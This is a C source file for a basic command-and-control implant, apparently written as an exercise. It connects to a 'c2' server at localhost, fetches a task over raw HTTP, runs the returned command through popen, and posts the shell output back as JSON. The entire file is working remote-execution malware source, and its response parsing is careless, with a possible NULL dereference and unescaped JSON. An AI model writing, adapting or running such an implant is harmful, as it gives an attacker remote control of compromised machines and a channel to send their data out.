#include <stdio.h>
#include <stdlib.h>
#include <string.h>
//for LinuxAPI
#include <unistd.h>
//for network
#include <sys/socket.h> //for sockets
#include <netinet/in.h> //for struct (example: sockaddr_in)
#include <arpa/inet.h> //for special func(inet_pton)

#define SERVER_IP "127.0.0.1"
#define SERVER_PORT 8080

void error_exit(const char* msg) {
    perror(msg);
    exit(EXIT_FAILURE);
}

int connect_to_c2() {
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if(sockfd == -1) {
        error_exit("socket");
    }

    struct sockaddr_in addr_server;
    memset(&addr_server, 0, sizeof(addr_server));
    addr_server.sin_family = AF_INET;
    addr_server.sin_port = htons(SERVER_PORT);
    inet_pton(AF_INET, SERVER_IP, &addr_server.sin_addr);

    if(connect(sockfd, (struct sockaddr*)&addr_server, sizeof(addr_server)) == -1) {
        error_exit("connect");
    }

    printf("[+] Connect to c2 success.\n");
    return sockfd;
}

void get_command_from_c2(char* task, char* command, size_t command_len) {
    int sockfd = connect_to_c2();

    //build request for c2
    char request[2048] = {0};
    snprintf(request, sizeof(request), "GET /get_task/%s HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n", task); 

    if(send(sockfd, request, strlen(request), 0) == -1) {
        error_exit("send");
    } 
    printf("[+] Get request send to c2.\n");

    int count_bytes = read(sockfd, request, sizeof(request) - 1);
    if(count_bytes == -1) {
        error_exit("read");
    }
    printf("[+] Answer from c2:\n %s\n\n", request);
    fflush(stdout);

    //for reliability and rewrite the last character '"'
    request[count_bytes - 1] = '\0';
    
    //parse
    char* temp_command = strstr(request, "\r\n\r\n");
    if(temp_command != NULL) {
        temp_command += 5; //because '"'
    }

    strncpy(command, temp_command, command_len); //ВАЖНО!!!
    close(sockfd);
}

void execute_command(char* command, char* result, size_t result_len) {
    sleep(1);
    
    FILE* fp;
    char chunk[256] = {0};
    
    fp = popen(command, "r");
    if(fp == NULL) {
        error_exit("popen");
    } 

    char temp_result[4096] = {0};
    while(fgets(chunk, sizeof(chunk), fp) != NULL) {
        strncat(temp_result, chunk, sizeof(temp_result) - strlen(temp_result) - 1);
    }

    strncpy(result, temp_result, result_len);
    pclose(fp);
}

void set_result_to_c2(char* result) {
    int sockfd = connect_to_c2();
   
    //check '\n'
    if(result[strlen(result) - 1] == '\n') {
        result[strlen(result) - 1] = '\0';
    } 
    char body[1024] = {0};
    snprintf(body, sizeof(body), "{\"result\": \"%s\"}", result);
    int body_len = strlen(body);

    char answer[4096] = {0};
    snprintf(answer, 
            sizeof(answer), 
            "POST /send_result HTTP/1.1\r\n"
                    "Host: 127.0.0.1\r\n"
                    "Connection: close\r\n"
                    "Content-Type: application/json\r\n"
                    "Content-Length: %d\r\n\r\n"
                    "%s", 
                    body_len,
                    body);
    
    if(send(sockfd, answer, strlen(answer), 0) == -1) {
        error_exit("send");
    }

    printf("[+] Send answer to c2.\n");
    close(sockfd);
}

int main() {
    char command[100] = {0};
    char result[4096] = {0};

    get_command_from_c2("task_2", command, sizeof(command));
    execute_command(command, result, sizeof(result));
    set_result_to_c2(result);

    return 0;
}
